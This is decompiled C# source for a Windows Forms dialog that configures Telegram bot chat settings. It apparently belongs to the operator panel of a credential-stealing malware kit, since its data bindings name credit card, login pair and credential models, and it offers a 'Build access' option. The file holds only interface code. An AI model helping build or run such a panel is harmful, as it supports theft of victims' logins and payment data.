using Meta.MainPanel.Data.Extensions;
using Meta.MainPanel.Data.UI;
using Meta.SharedModels;
using MetroSet_UI.Controls;
using System;
using System.Drawing;
using System.Windows.Forms;

namespace Meta.MainPanel.Views;

public class TelegramConfigurator : Form
{
    public TelegramChatSettings CurrentChatSettings;

    private object object_0;

    private object topHeader;

    private object mainTitle;

    private object closeBtn;

    private object object_1;

    private object object_2;

    private object logContextMenu;

    private object copyToolStripMenuItem;

    private object object_3;

    private object a;

    private object b;

    private object c;

    private object d;

    public TelegramConfigurator(TelegramChatSettings chatSettings)
    {
        InitializeComponent();
        this.AllowDraggBy((Control)topHeader);
        this.ApplyShadows();
        CurrentChatSettings = chatSettings;
        ((MetroSetCheckBox)c).Checked = chatSettings.BuildAccess;
        ((TelegramBotSettingsControl)a).SetChatSettings(chatSettings);
    }

    private void closeBtn_Click(object sender, object e)
    {
        base.DialogResult = DialogResult.Cancel;
        Close();
    }

    private void topHeader_Paint(object sender, object e)
    {
        int num = ((Control)topHeader).Width - 1;
        int num2 = ((Control)topHeader).Height - 1;
        Pen pen = new Pen(ColorPicker.ThemeColor, 3f);
        ((PaintEventArgs)e).Graphics.DrawRectangle(pen, 0, 0, num, num2);
    }

    private void TelegramConfigurator_Paint(object sender, object e)
    {
        int num = base.Width - 1;
        int num2 = base.Height - 1;
        Pen pen = new Pen(ColorPicker.ThemeColor, 3f);
        ((PaintEventArgs)e).Graphics.DrawRectangle(pen, 0, 0, num, num2);
    }

    private void b_Click(object sender, object e)
    {
        TelegramChatSettings chatSettings = ((TelegramBotSettingsControl)a).GetChatSettings();
        chatSettings.BuildAccess = ((MetroSetCheckBox)c).Checked;
        if (!string.IsNullOrWhiteSpace(chatSettings.MessageFormat))
        {
            CurrentChatSettings = chatSettings;
            base.DialogResult = DialogResult.OK;
            Close();
        }
        else
        {
            MessageBox.Show(this, "Please, enter a message format");
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && object_0 != null)
        {
            ((IDisposable)object_0).Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.object_0 = new System.ComponentModel.Container();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Meta.MainPanel.Views.TelegramConfigurator));
        this.topHeader = new System.Windows.Forms.Panel();
        this.mainTitle = new System.Windows.Forms.Label();
        this.closeBtn = new System.Windows.Forms.Label();
        this.logContextMenu = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_0);
        this.copyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.object_3 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_0);
        this.object_2 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_0);
        this.object_1 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_0);
        this.a = new Meta.MainPanel.Data.UI.TelegramBotSettingsControl();
        this.b = new MetroSet_UI.Controls.MetroSetButton();
        this.c = new MetroSet_UI.Controls.MetroSetCheckBox();
        this.d = new System.Windows.Forms.Label();
        ((System.Windows.Forms.Control)this.topHeader).SuspendLayout();
        ((System.Windows.Forms.Control)this.logContextMenu).SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.object_3).BeginInit();
        ((System.ComponentModel.ISupportInitialize)this.object_2).BeginInit();
        ((System.ComponentModel.ISupportInitialize)this.object_1).BeginInit();
        base.SuspendLayout();
        ((System.Windows.Forms.Control)this.topHeader).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.topHeader).Controls.Add((System.Windows.Forms.Control)this.mainTitle);
        ((System.Windows.Forms.Control)this.topHeader).Controls.Add((System.Windows.Forms.Control)this.closeBtn);
        ((System.Windows.Forms.Control)this.topHeader).Dock = System.Windows.Forms.DockStyle.Top;
        ((System.Windows.Forms.Control)this.topHeader).ForeColor = System.Drawing.Color.Silver;
        ((System.Windows.Forms.Control)this.topHeader).Location = new System.Drawing.Point(0, 0);
        ((System.Windows.Forms.Control)this.topHeader).Name = "topHeader";
        ((System.Windows.Forms.Control)this.topHeader).Size = new System.Drawing.Size(871, 30);
        ((System.Windows.Forms.Control)this.topHeader).TabIndex = 2;
        ((System.Windows.Forms.Control)this.topHeader).Paint += new System.Windows.Forms.PaintEventHandler(topHeader_Paint);
        ((System.Windows.Forms.Control)this.mainTitle).AutoSize = true;
        ((System.Windows.Forms.Control)this.mainTitle).Font = new System.Drawing.Font("Segoe UI", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.mainTitle).ForeColor = System.Drawing.Color.FromArgb(64, 224, 208);
        ((System.Windows.Forms.Control)this.mainTitle).Location = new System.Drawing.Point(3, 4);
        ((System.Windows.Forms.Control)this.mainTitle).Name = "mainTitle";
        ((System.Windows.Forms.Control)this.mainTitle).Size = new System.Drawing.Size(139, 20);
        ((System.Windows.Forms.Control)this.mainTitle).TabIndex = 2;
        ((System.Windows.Forms.Control)this.mainTitle).Text = "Meta | Configurator";
        ((System.Windows.Forms.Control)this.closeBtn).AutoSize = true;
        ((System.Windows.Forms.Control)this.closeBtn).Font = new System.Drawing.Font("Segoe UI Semibold", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.closeBtn).ForeColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.closeBtn).Location = new System.Drawing.Point(847, 3);
        ((System.Windows.Forms.Control)this.closeBtn).Name = "closeBtn";
        ((System.Windows.Forms.Control)this.closeBtn).Size = new System.Drawing.Size(20, 21);
        ((System.Windows.Forms.Control)this.closeBtn).TabIndex = 1;
        ((System.Windows.Forms.Control)this.closeBtn).Text = "X";
        ((System.Windows.Forms.Control)this.closeBtn).Click += new System.EventHandler(closeBtn_Click);
        ((System.Windows.Forms.ToolStrip)this.logContextMenu).Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { (System.Windows.Forms.ToolStripItem)this.copyToolStripMenuItem });
        ((System.Windows.Forms.Control)this.logContextMenu).Name = "logContextMenu";
        ((System.Windows.Forms.Control)this.logContextMenu).Size = new System.Drawing.Size(103, 26);
        ((System.Windows.Forms.ToolStripItem)this.copyToolStripMenuItem).Name = "copyToolStripMenuItem";
        ((System.Windows.Forms.ToolStripItem)this.copyToolStripMenuItem).Size = new System.Drawing.Size(102, 22);
        ((System.Windows.Forms.ToolStripItem)this.copyToolStripMenuItem).Text = "Copy";
        ((System.Windows.Forms.BindingSource)this.object_3).DataSource = typeof(Meta.SharedModels.CreditCard);
        ((System.Windows.Forms.BindingSource)this.object_2).DataSource = typeof(Meta.SharedModels.LoginPair);
        ((System.Windows.Forms.BindingSource)this.object_1).DataSource = typeof(Meta.SharedModels.Credentials);
        ((System.Windows.Forms.Control)this.a).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.a).Location = new System.Drawing.Point(7, 36);
        ((System.Windows.Forms.Control)this.a).Name = "telegramBotSettingsControl";
        ((System.Windows.Forms.Control)this.a).Size = new System.Drawing.Size(857, 330);
        ((System.Windows.Forms.Control)this.a).TabIndex = 3;
        ((MetroSet_UI.Controls.MetroSetButton)this.b).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.b).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.b).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.b).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.b).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.b).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.b).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.b).Location = new System.Drawing.Point(364, 372);
        ((System.Windows.Forms.Control)this.b).Name = "saveBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.b).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.b).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.b).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.b).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.b).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.b).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.b).Size = new System.Drawing.Size(102, 20);
        ((MetroSet_UI.Controls.MetroSetButton)this.b).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.b).StyleManager = null;
        ((System.Windows.Forms.Control)this.b).TabIndex = 23;
        ((System.Windows.Forms.Control)this.b).Text = "Save";
        ((MetroSet_UI.Controls.MetroSetButton)this.b).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.b).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.b).Click += new System.EventHandler(b_Click);
        ((System.Windows.Forms.Control)this.c).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.c).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.c).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.c).Checked = false;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.c).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.c).CheckState = MetroSet_UI.Enums.CheckState.Unchecked;
        ((System.Windows.Forms.Control)this.c).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.c).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.c).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.c).Location = new System.Drawing.Point(160, 375);
        ((System.Windows.Forms.Control)this.c).Name = "buildAccessCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.c).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.c).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.c).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.c).StyleManager = null;
        ((System.Windows.Forms.Control)this.c).TabIndex = 145;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.c).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.c).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.d).AutoSize = true;
        ((System.Windows.Forms.Control)this.d).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.d).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.d).Location = new System.Drawing.Point(26, 375);
        ((System.Windows.Forms.Control)this.d).Name = "buildAccessLbl";
        ((System.Windows.Forms.Control)this.d).Size = new System.Drawing.Size(74, 15);
        ((System.Windows.Forms.Control)this.d).TabIndex = 144;
        ((System.Windows.Forms.Control)this.d).Text = "Build access:";
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        base.ClientSize = new System.Drawing.Size(871, 403);
        base.Controls.Add((System.Windows.Forms.Control)this.c);
        base.Controls.Add((System.Windows.Forms.Control)this.d);
        base.Controls.Add((System.Windows.Forms.Control)this.b);
        base.Controls.Add((System.Windows.Forms.Control)this.a);
        base.Controls.Add((System.Windows.Forms.Control)this.topHeader);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Name = "TelegramConfigurator";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "Meta | Configurator";
        base.Paint += new System.Windows.Forms.PaintEventHandler(TelegramConfigurator_Paint);
        ((System.Windows.Forms.Control)this.topHeader).ResumeLayout(false);
        ((System.Windows.Forms.Control)this.topHeader).PerformLayout();
        ((System.Windows.Forms.Control)this.logContextMenu).ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.object_3).EndInit();
        ((System.ComponentModel.ISupportInitialize)this.object_2).EndInit();
        ((System.ComponentModel.ISupportInitialize)this.object_1).EndInit();
        base.ResumeLayout(false);
        base.PerformLayout();
    }
}
